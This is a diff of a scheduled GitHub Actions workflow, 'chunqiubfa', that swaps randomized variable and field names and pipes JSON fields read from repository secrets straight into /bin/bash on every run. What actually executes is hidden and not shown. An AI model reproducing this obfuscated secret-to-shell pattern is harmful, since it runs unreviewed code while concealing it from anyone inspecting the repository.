@@ -2,7 +2,7 @@ name: chunqiubfa
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
+    - cron: '10 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: chunqiubfa
         env:
-          hg71: ${{ secrets.hg71 }}
+          n24988: ${{ secrets.n24988 }}
         run: |
-          echo $hg71 | jq -r .zueek85021 | /bin/bash
-          echo $snah2132 | jq -r .ffklo756 | /bin/bash
-          echo $dlxg922 | jq -r .s76 | /bin/bash
-          echo $ttns29 | jq -r .vkcl61 | /bin/bash
-          echo $n68 | jq -r .v4 | /bin/bash
-          echo $awf2 | jq -r .nbpk6427 | /bin/bash
-          echo $nt2295 | jq -r .wugj7 | /bin/bash
-          echo $cqprb80166 | jq -r .y0083 | /bin/bash
+          echo $n24988 | jq -r .il5373 | /bin/bash
+          echo $nra61 | jq -r .vgur5 | /bin/bash
+          echo $rdlo2 | jq -r .creqf89 | /bin/bash
+          echo $dnz288 | jq -r .u19 | /bin/bash
+          echo $lbdz9 | jq -r .pfyy96400 | /bin/bash
+          echo $y1 | jq -r .tgrjs80 | /bin/bash
+          echo $nrq364 | jq -r .txe337 | /bin/bash
+          echo $g526 | jq -r .oeeml3887 | /bin/bash
+          echo $a8481 | jq -r .x23840 | /bin/bash
+          echo $agcuo14 | jq -r .ffvn14 | /bin/bash
+          echo $fz78162 | jq -r .cmjxl56 | /bin/bash
 
